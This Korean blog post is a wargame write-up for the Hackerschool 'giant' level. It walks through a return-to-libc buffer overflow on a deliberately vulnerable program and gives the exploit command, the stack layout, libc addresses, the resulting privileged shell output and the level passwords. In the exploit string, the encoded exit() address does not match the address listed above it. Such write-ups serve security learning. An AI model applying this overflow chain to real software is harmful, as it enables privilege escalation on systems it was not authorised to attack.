---
layout: post
title: "[Wargame] 해커스쿨 LEVEL14 (Bugbear -> Giant) : RTL2, Only Execve"
date: 2015-11-30 02:03:10
category: wargame
tags:  bof 
---

- id = bugbear
- pw = new divide

<!--more--> 

## 1. 문제 : giant.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - giant
        - RTL2
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

main(int argc, char *argv[])
{
        char buffer[40];
        FILE *fp;
        char *lib_addr, *execve_offset, *execve_addr;
        char *ret;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // gain address of execve
        fp = popen("/usr/bin/ldd /home/giant/assassin | /bin/grep ibc | /bin/awk '{print $4}'", "r");
        fgets(buffer, 255, fp);
        sscanf(buffer, "(%x)", &lib_addr);
        fclose(fp);

        fp = popen("/usr/bin/nm /lib/libc.so.6 | /bin/grep __execve | /bin/awk '{print $1}'", "r");
        fgets(buffer, 255, fp);
        sscanf(buffer, "%x", &execve_offset);
        fclose(fp);

        execve_addr = lib_addr + (int)execve_offset;
        // end

        memcpy(&ret, &(argv[1][44]), 4);
        if(ret != execve_addr)
        {
                printf("You must use execve!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
}
```

### 1.1 변경된 코드

앞부분에 추가된 내용은 execve() 함수의 주소를 얻기 위함이고, 주변 변경 사항은 아래와 같이 RTL 공격에 사용된 함수가 execv() 이어야 한다는 것이다.

```c
memcpy(&ret, &(argv[1][44]), 4);
if(ret != execve_addr)
{
    printf("You must use execve!\n");
    exit(0);
}
```

## 2. 공격 준비

### 2.1 공격 방법 고민

#### 2.1.1 execve() 주소 = 0x400a9d48

```
(gdb) p execve
$1 = {<text variable, no debug info>} 0x400a9d48 <__execve>
```

## 2.4 LR 확인 : 계속 실패 ???

앞에서 확인한 execve() 값을 넣고 조건 체크 넘어가는지 확인.

```bash
> ./giant `python -c 'print "\x90"*44 + "\x48\x9d\x0a\x40"'` 
You must use execve!
```

이상하게도 execve() 값을 제대로 넣고 실행을 했은데도 계속 조건 체크 if 문제 걸려서 제대로 동작하지 않는거다… T_T; XXX 는 값을 shell 에서 evaluation 한 것인데, 현재 0x0a = New Line 으로 인하여 값이 제대로 들어가지 않는다고 한다. "XXX" 와 같이 " 를 이용하여 모든 값을 문자열로 전달하여야 한다(고 한다.)

```bash
$ > ./giant "`python -c 'print "\x90"*44 + "\x48\x9d\x0a\x40"'`"
H
@
Segmentation fault
```

### 2.5 Stack 구성

```
[ Buffer[40] ][ SFR ][ LR ][ ...]
= [ Buffer[44] ][ execve() ][ system() ][ exit() ][ /bin/sh ]

- execve() : 0x400a9d48
- system() : 0x40058ae0
- exit()   : 0x400391e0
- /bin/sh  : 0x400fbff9
```

## 3 Exploit

```bash
$ > ./giant "`python -c 'print "\x90"*44 + "\x48\x9d\x0a\x40" + "\xe0\x8a\x05\x40" + "\xe0\x9a\x03\x40" + "\xf9\xbf\x0f\x40"'`"  
H
@à@à@ù¿@

bash$ id
uid=513(bugbear) gid=513(bugbear) euid=514(giant) egid=514(giant) groups=513(bugbear)
```

## 4. 다음 단계 정보

```bash
bash$ id
uid=513(bugbear) gid=513(bugbear) euid=514(giant) egid=514(giant) groups=513(bugbear)

bash$ my-pass
euid = 514
one step closer
```






